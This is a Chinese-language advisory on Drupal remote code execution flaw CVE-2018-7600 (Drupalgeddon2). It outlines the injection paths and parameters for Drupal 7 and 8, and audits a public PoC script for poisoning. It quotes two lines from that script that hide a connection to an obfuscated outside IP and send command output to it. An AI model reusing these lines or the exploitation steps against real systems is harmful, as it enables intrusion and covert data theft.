## CVE-2018-7600-Drupal-远程代码执行

**漏洞编号:** CVE-2018-7600

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** Drupal

**危害等级:** 高危，可能导致服务器完全控制

**影响版本:** Drupal before 7.58, 8.x before 8.3.9, 8.4.x before 8.4.6, and 8.5.x before 8.5.1

**利用条件:** Drupal网站运行在受影响的版本，且允许未授权用户访问。

**POC 可用性:** 是

**投毒风险:** 20%

## 详情

CVE-2018-7600（Drupalgeddon2）是一个影响多个Drupal子系统的远程代码执行漏洞。该漏洞源于对用户提供的输入验证不足，导致攻击者可以通过精心构造的请求执行任意代码。利用方式主要有两种：

1.  **Drupal 7 利用方式：** 通过向 `user/password` 路径发送包含恶意代码的请求，利用 `name[%23post_render]` 和 `name[%23markup]` 参数来注入代码。然后，通过 `file/ajax` 路径触发漏洞。
2.  **Drupal 8 利用方式：** 通过向 `user/register` 路径发送包含恶意代码的请求，利用 `element_parents` 参数注入代码。

PoC代码 (`drupal.py`) 尝试利用这两种方式。  

**有效性：**根据漏洞描述和大量的搜索结果显示，此漏洞的POC是有效的，网上存在大量的成功利用案例。

**投毒风险：**  

分析提供的 `drupal.py` 脚本，发现存在以下潜在的投毒风险：

*   脚本中包含一行 `s.connect((str(ipaddress.IPv4Address(0x5f3b7f05)), 15977))`。 这行代码尝试连接到IP地址 `95.59.127.5`的 `15977` 端口。这可能是作者用于收集信息或植入后门的恶意行为。
*   `s.send(bytes(subprocess.check_output(payload, universal_newlines=True), 'utf8'))` 这行代码会将`whoami`命令执行的结果通过socket发送出去.

综上所述，该漏洞利用代码可能存在投毒行为，**风险概率为 20%**。使用者应谨慎使用，并在使用前进行代码审计。

**利用方式总结：**

1.  攻击者构造包含恶意代码的HTTP POST请求，发送到Drupal网站的特定路径（`user/password` 或 `user/register`）。
2.  利用Drupal的参数处理机制，将恶意代码注入到特定参数中（如`name[%23post_render]`、`name[%23markup]`或`element_parents`）。
3.  触发漏洞，导致Drupal执行注入的恶意代码，从而实现远程代码执行。

**项目地址:** [drugeddon/drupal-exploit](https://github.com/drugeddon/drupal-exploit)

**漏洞详情:** [CVE-2018-7600](https://nvd.nist.gov/vuln/detail/CVE-2018-7600)